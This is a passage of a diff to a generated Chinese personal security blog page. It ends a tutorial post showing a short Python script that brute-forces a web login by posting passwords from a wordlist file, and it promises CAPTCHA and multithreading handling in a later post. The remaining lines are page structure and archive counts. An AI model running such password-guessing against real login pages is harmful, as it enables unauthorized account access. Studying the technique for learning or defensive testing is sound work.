requests.post(url,data=data,headers=hea)</span><br><span class="line">content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(<span class="string">r'C:\Users\Leticia\Desktop\mutou.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">    password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    data = &#123;<span class="string">'pwd'</span>:password&#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'trying'</span>,password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    html=content.text</span><br><span class="line">    <span class="keyword">if</span> html != recv:</span><br><span class="line">        <span class="keyword">print</span> html</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/f.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/python/g.png" alt="">  </p>
+<p>这个脚本的雏形就有了，可以爆破出结果，但是还存在速度很慢，遇到验证码无法进行等问题，下一节再加上验证码处理和多线程处理的模块,解决了这几个问题，就可以用来处理常见的网站了。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/29/ctf中常见的隐写术/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1364,183 +2111,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/03/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/04/03/hello-world/" itemprop="url">
-                  博客搭建完成了
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-03T20:15:05+08:00">
-                2017-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/搭建博客/" itemprop="url" rel="index">
-                    <span itemprop="name">搭建博客</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/04/03/hello-world/" class="leancloud_visitors" data-flag-title="博客搭建完成了">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>费了很多功夫，犯了很多错误，不过总算把博客搭建好了，以后会在这个博客里面上传一些平时学到的<br>东西，欢迎各位大佬来指导。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1585,7 +2160,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">47</span>
+                <span class="site-state-item-count">51</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1596,7 +2171,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-count">14</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1607,7 +2182,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-count">46</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
